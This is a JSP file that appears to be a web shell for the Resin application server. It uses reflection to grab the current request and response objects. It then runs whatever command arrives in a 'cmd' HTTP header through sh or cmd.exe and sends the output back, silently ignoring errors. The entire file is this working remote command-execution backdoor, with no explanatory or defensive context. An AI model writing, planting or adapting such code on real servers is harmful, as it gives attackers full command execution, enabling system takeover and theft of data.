<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.io.Writer" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.util.Scanner" %>

<%
    try{
        Object currentRequest = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation").getMethod("getContextRequest").invoke(null);
        Field _responseF;
        if(currentRequest.getClass().getName().contains("com.caucho.server.http.HttpRequest")){
            // 3.x 需要从父类中获取
            _responseF = currentRequest.getClass().getSuperclass().getDeclaredField("_response");
        }else{
            _responseF = currentRequest.getClass().getDeclaredField("_response");
        }
        _responseF.setAccessible(true);
        Object currentResponse = _responseF.get(currentRequest);
        Method getWriterM = currentResponse.getClass().getMethod("getWriter");
        Writer writer = (PrintWriter)getWriterM.invoke(currentResponse);
        Method getHeaderM = currentRequest.getClass().getMethod("getHeader", String.class);
        String cmd = (String)getHeaderM.invoke(currentRequest, "cmd");
        boolean isLinux = true;
        String osTyp = System.getProperty("os.name");
        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
            isLinux = false;
        }
        String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
        Scanner scanner = (new Scanner(Runtime.getRuntime().exec(cmds).getInputStream())).useDelimiter("\\A");
        writer.write(scanner.hasNext() ? scanner.next() : "");
    } catch (Exception e) {
    }
%>
